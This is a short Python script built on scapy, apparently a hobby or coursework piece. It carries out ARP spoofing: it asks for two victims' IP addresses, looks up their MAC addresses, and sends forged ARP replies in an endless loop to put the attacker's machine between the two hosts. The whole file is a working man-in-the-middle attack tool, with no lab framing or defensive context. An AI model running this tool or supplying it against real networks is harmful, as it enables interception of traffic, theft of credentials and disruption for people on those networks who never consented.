import sys
from scapy.all import *

def getVictimMac(victimIP): #This receives the Mac Address from the give IP Address
    macVictimList = sr1(ARP(op=1, pdst=victimIP), verbose=0)
    return macVictimList[0][ARP].hwsrc

def spoofArp(opArp, spoofedIP, spoofedMac, victimIP, victimMac): #Documentation from link: Send ARP
    return ARP(op=opArp, psrc=spoofedIP, hwsrc=spoofedMac, pdst=victimIP, hwdst=victimMac)

victim1 = raw_input("Please enter the first victim's IP Address: ")
victim2 = raw_input("Please enter the second victim's IP Address: ")


victim1Mac = getVictimMac(victim1)
victim2Mac = getVictimMac(victim2)

myMacList = [get_if_hwaddr(i) for i in get_if_list()] #Googled to find code to get your own Mac Address
for mac in myMacList:
	if (mac !="00:00:00:00:00:00"):
		myMac = mac

print("My Mac Address is ",myMac)

firstARP = spoofArp(1, victim1, myMac, victim2, victim2Mac) #Create ARP for the target
secondARP = spoofArp(1, victim2, myMac, victim1, victim1Mac) #Create ARP for router


print firstARP.show()
print secondARP.show()

while(1): #Repeatedly send ARPs
    send(firstARP, verbose=0)
    send(secondARP, verbose=0)
